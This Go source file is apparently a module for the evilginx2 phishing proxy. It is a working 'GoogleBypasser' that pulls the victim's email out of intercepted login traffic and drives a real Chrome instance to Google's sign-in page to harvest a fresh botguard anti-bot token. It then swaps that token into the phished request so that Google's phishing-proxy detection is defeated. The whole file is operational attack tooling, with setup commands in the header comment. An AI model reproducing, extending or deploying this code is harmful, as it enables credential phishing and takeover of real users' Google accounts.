// To configure everything just run this single one liner command
 // sudo apt update && sudo apt install -y xvfb google-chrome-stable && Xvfb :99 -screen 0 1920x1080x24 & export DISPLAY=:99

 package core

 import (
 	"bytes"
 	"encoding/json"
 	"fmt"
 	"net/http"
 	"net/url"
 	"regexp"
 	"strings"
 	"sync"
 	"time"

 	"github.com/go-rod/rod"
 	"github.com/go-rod/rod/lib/input"
 	"github.com/go-rod/rod/lib/proto"
 	"github.com/kgretzky/evilginx2/log"
 )

 type GoogleBypasser struct {
 	browser        *rod.Browser
 	page           *rod.Page
 	isHeadless     bool
 	withDevTools   bool
 	slowMotionTime time.Duration

 	token string
 	email string
 }

 var bgRegexp = regexp.MustCompile(`\[\[\["V1UmUe","\[null,\\"([^"]+)\\"`))

 // func (b *GoogleBypasser) Launch() {
 // 	log.Debug("[GoogleBypasser]: : Launching Browser .. ")
 // 	u := launcher.New().
 // 		Headless(b.isHeadless).
 // 		Devtools(b.withDevTools).
 // 		NoSandbox(true).
 // 		MustLaunch()
 // 	b.browser = rod.New().ControlURL(u)
 // 	if b.slowMotionTime > 0 {
 // 		b.browser = b.browser.SlowMotion(b.slowMotionTime)
 // 	}
 // 	b.browser = b.browser.MustConnect()
 // 	b.page = stealth.MustPage(b.browser)
 // }

 func getWebSocketDebuggerURL() (string, error) {
 	resp, err := http.Get("http://127.0.0.1:9222/json")
 	if err != nil {
 		return "", err
 	}
 	defer resp.Body.Close()

 	var targets []map[string]interface{}
 	if err := json.NewDecoder(resp.Body).Decode(&targets); err != nil {
 		return "", err
 	}

 	if len(targets) == 0 {
 		return "", fmt.Errorf("no targets found")
 	}

 	// Return the WebSocket debugger URL of the first target
 	return targets[0]["webSocketDebuggerUrl"].(string), nil
 }

 // Use https://bot.sannysoft.com/ to test the Headless Browser detection. Just open that url in automated browser and check result.

 func (b *GoogleBypasser) Launch() {
 	log.Debug("[GoogleBypasser]: Launching Browser .. ")

 	wsURL, err := getWebSocketDebuggerURL()
 	if err != nil {
 		log.Error("Failed to get WebSocket debugger URL: %v", err)
 		log.Error("Make sure Chrome is running with: google-chrome --remote-debugging-port=9222 --no-sandbox")
 		return
 	}

 	log.Debug("[GoogleBypasser]: Connecting to Chrome at: %s", wsURL)
 	b.browser = rod.New().ControlURL(wsURL)
 	if b.slowMotionTime > 0 {
 		b.browser = b.browser.SlowMotion(b.slowMotionTime)
 	}

 	// Connect to the browser with timeout
 	err = b.browser.Connect()
 	if err != nil {
 		log.Error("Failed to connect to Chrome browser: %v", err)
 		return
 	}

 	// Create a new page
 	b.page = b.browser.MustPage()
 	log.Debug("[GoogleBypasser]: Browser connected and page created.")
 }

 func (b *GoogleBypasser) GetEmail(body []byte) {
 	// Updated regex to match the actual format in the request
 	exp := regexp.MustCompile(`\[\[\["V1UmUe","\[null,\\"([^"]+)\\"`))
 	email_match := exp.FindSubmatch(body)
 	matches := len(email_match)
 	if matches < 2 {
 		log.Error("[GoogleBypasser]: Found %v matches for email in request.", matches)
 		log.Debug("[GoogleBypasser]: Request body for email search: %s", string(body))
 		return
 	}
 	log.Debug("[GoogleBypasser]: Found email in body : %v", string(email_match[1]))
 	b.email = string(bytes.Replace(email_match[1], []byte("%40"), []byte("@"), -1))
 	log.Success("[GoogleBypasser]: Extracted email for bypass: %v", b.email)
 }

 func (b *GoogleBypasser) GetToken() {
 	stop := make(chan struct{})
 	var once sync.Once
 	timeout := time.After(200 * time.Second)

 	go b.page.EachEvent(func(e *proto.NetworkRequestWillBeSent) {
 		if strings.Contains(e.Request.URL, "/v3/signin/_/AccountsSignInUi/data/batchexecute?") && strings.Contains(e.Request.URL, "rpcids=V1UmUe") {
 			log.Debug("[GoogleBypasser]: Intercepted target request: %s", e.Request.URL)

 			// Decode URL encoded body
 			decodedBody, err := url.QueryUnescape(string(e.Request.PostData))
 			if err != nil {
 				log.Error("Failed to decode body while trying to obtain fresh botguard token: %v", err)
 				return
 			}
 			
 			log.Debug("[GoogleBypasser]: Searching for botguard token in decoded body")
 			matches := bgRegexp.FindStringSubmatch(decodedBody)
 			if len(matches) > 1 {
 				b.token = matches[1]
 				log.Success("[GoogleBypasser]: Successfully extracted botguard token: %s", b.token)
 			} else {
 				log.Error("[GoogleBypasser]: No botguard token found in request body")
 				log.Debug("[GoogleBypasser]: Request body content: %s", decodedBody)
 				return
 			}
 			once.Do(func() { close(stop) })
 		}
 	})()

 	log.Debug("[GoogleBypasser]: Navigating to Google login page ...")
 	err := b.page.Navigate("https://accounts.google.com/signin/v2/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin")
 	if err != nil {
 		log.Error("Failed to navigate to Google login page: %v", err)
 		return
 	}

 	log.Debug("[GoogleBypasser]: Waiting for the email input field ...")
 	
 	// Wait for page to load and try to find email field with timeout
 	b.page.MustWaitLoad()
 	emailField, err := b.page.Timeout(10 * time.Second).Element("#identifierId")
 	if err != nil {
 		log.Error("Failed to find the email input field within timeout: %v", err)
 		return
 	}

 	err = emailField.Input(b.email)
 	if err != nil {
 		log.Error("Failed to input email: %v", err)
 		return
 	}
 	log.Debug("[GoogleBypasser]: Entered target email : %v", b.email)

 	err = b.page.Keyboard.Press(input.Enter)
 	if err != nil {
 		log.Error("Failed to submit the login form: %v", err)
 		return
 	}
 	log.Debug("[GoogleBypasser]: Submitted Login Form ...")

 	//<-stop
 	select {
 	case <-stop:
 		// Check if the token is empty
 		for b.token == "" {
 			select {
 			case <-time.After(1 * time.Second): // Check every second
 				log.Printf("[GoogleBypasser]: Waiting for token to be obtained...")
 			case <-timeout:
 				log.Printf("[GoogleBypasser]: Timed out while waiting to obtain the token")
 				return
 			}
 		}
 		//log.Printf("[GoogleBypasser]: Successfully obtained token: %v", b.token)
 		// Close the page after obtaining the token
 		err := b.page.Close()
 		if err != nil {
 			log.Error("Failed to close the page: %v", err)
 		}
 	case <-timeout:
 		log.Printf("[GoogleBypasser]: Timed out while waiting to obtain the token")
 		return
 	}
 }

 func (b *GoogleBypasser) ReplaceTokenInBody(body []byte) []byte {
 	log.Debug("[GoogleBypasser]: Starting token replacement in body")
 	if b.token == "" {
 		log.Error("[GoogleBypasser]: No token available for replacement")
 		return body
 	}
 	
 	// Replace the full match including the V1UmUe pattern with the fresh token
 	newBody := bgRegexp.ReplaceAllStringFunc(string(body), func(match string) string {
 		log.Debug("[GoogleBypasser]: Found token match to replace: %s", match)
 		// Keep the structure but replace with fresh token
 		return `[["V1UmUe","[null,\"` + b.token + `\"`
 	})
 	
 	if newBody == string(body) {
 		log.Warning("[GoogleBypasser]: No token replacement occurred - pattern might not match")
 		log.Debug("[GoogleBypasser]: Body content: %s", string(body))
 	} else {
 		log.Success("[GoogleBypasser]: Successfully replaced botguard token in request body")
 	}
 	return []byte(newBody)
 }
